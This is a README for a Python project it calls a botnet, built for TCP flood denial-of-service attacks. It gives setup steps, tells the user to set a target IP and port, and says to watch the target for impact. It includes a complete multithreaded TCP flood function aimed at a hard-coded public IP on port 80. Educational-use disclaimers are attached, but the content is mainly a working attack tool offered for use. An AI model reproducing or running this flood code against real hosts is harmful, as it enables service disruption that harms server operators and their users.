# Botnet Project

## Overview

This project is a simple Python-based botnet designed for TCP flood DDoS attacks. It demonstrates the basics of implementing a botnet and can be used for educational purposes. The project is configured to run on a controlled environment with explicit permissions.

## Features

- **TCP Flood Attacks**: Perform TCP flood attacks to test the resilience of target systems.
- **Multithreading**: Use multiple threads to increase attack intensity.

## Prerequisites

- Python 3
- Basic knowledge of networking and DDoS attacks
- Legal permission to test the botnet on the target system

## Installation

### Clone the Repository

First, clone the repository to your local machine:

```bash
git clone https://github.com/yourusername/botnet-project.git
cd botnet-project
```

### Install Dependencies

Install the required Python packages using `pip`. If you don’t have `pip`, install it first.

Create a virtual environment (optional but recommended):

```bash
python -m venv venv
source venv/bin/activate  # On Windows use: venv\Scripts\activate
```

Install dependencies:

```bash
pip install -r requirements.txt
```

## Configuration

### Edit `main.py`

Open `main.py` and modify the target IP address and port directly in the code. Look for the following section and update the values:

```python
# Example configuration
TARGET_IP = '34.149.87.45'
TARGET_PORT = 80
```

Replace `'34.149.87.45'` with the IP address of the target and `80` with the desired port number.

## Usage

Run the botnet with the following command:

```bash
python main.py
```

### Example

Here’s an example of running the botnet:

1. Ensure you have updated the `TARGET_IP` and `TARGET_PORT` in `main.py`.
2. Start the botnet:

   ```bash
   python main.py
   ```

3. Monitor the target system to observe the impact.

## Testing

To test the botnet, use a controlled environment and ensure you have all necessary permissions. Start with a low-intensity test to verify functionality:

```python
# Example of starting the botnet with low intensity
import socket
import threading

def tcp_flood(target_ip, target_port, num_threads):
    def flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        try:
            sock.connect((target_ip, target_port))
            while True:
                sock.sendto(b'X' * 1024, (target_ip, target_port))
        except socket.error:
            pass
        finally:
            sock.close()

    threads = [threading.Thread(target=flood) for _ in range(num_threads)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

tcp_flood('34.149.87.45', 80, 10)  # Example: Flood port 80 with 10 threads
```

## Contributing

Contributions are welcome! Please follow these guidelines:

1. Fork the repository and create a pull request.
2. Ensure your code follows the project’s coding style.
3. Add or update documentation as needed.


## Disclaimer

This project is intended for educational purposes only. Unauthorized use of this software may be illegal and unethical. Always obtain explicit permission before conducting any testing or attacks.

## Contact

For any questions or feedback, you can reach me via:

- **Email**: mayurjadhav0232@gmail.com
- **GitHub**: https://github.com/mayurjadhav-23
